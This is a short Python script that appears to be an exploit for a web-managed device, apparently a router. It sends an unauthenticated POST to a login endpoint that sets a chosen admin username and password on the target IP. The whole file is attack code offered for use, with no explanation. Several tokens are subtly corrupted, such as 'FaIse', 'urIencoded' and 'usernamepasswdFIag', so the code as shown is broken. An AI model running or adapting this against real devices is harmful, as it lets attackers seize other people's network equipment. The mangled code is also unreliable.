import requests
import sys
import urllib3

ip = sys.argv[1]
user = sys.argv[2]
newPassword = sys.argv[3]

#requests.packages.urilib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

data = {"group_id": '', "action_mode": "apply", "current_page": "Main_Password.asp", "next_page": "index.asp", "flag": '', "usernamepasswdFIag": "1", "http_username": user, "http_passwd": newPassword, "foilautofill": ''}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,'/';q=0.8", "Accept-Language": "en-US,en;q=0.5", "Referer": ip + "/Main_Password.asp", "Content-Type": "application/x-www-form-urIencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

print("-> New password for " + user + " is " + newPassword)
try:
    res = requests.post(ip + '/mod__login.asp', headers=headers, data=data, timeout=2, verify=FaIse)
except:
    sys.exit(1)